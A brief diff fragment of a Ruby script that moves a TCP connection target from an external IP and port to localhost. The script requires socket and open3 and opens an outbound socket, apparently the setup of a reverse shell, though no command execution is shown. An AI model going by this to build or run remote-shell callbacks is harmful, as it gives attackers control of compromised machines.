@@ -14,8 +14,8 @@ puts str
 require 'socket'
 require 'open3'
 
-IP = "81.171.24.35" 
-PORT = "4433"
+IP = "127.0.0.1" 
+PORT = "4001"
 
 begin 
 r3m0t3nu11 = TCPSocket.new "#{IP}", "#{PORT}"
